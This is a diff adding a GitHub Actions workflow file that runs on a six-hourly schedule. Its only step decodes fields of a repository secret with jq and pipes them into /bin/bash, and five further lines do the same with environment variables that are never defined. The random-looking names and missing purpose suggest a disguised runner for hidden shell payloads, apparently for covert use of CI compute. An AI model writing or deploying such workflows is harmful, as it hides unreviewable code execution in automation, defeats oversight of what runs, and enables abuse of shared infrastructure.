@@ -1,0 +1,23 @@
+name: websocketthomascfg
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: websocketthomascfg
+        env:
+          xjyy06: ${{ secrets.xjyy06 }}
+        run: |
+          echo $xjyy06 | jq -r .l2 | /bin/bash
+          echo $f85884 | jq -r .irpq822 | /bin/bash
+          echo $th15231 | jq -r .xvnnl54130 | /bin/bash
+          echo $howwd857 | jq -r .t78 | /bin/bash
+          echo $q6962 | jq -r .d42 | /bin/bash
+          echo $odgp59640 | jq -r .b2919 | /bin/bash
+
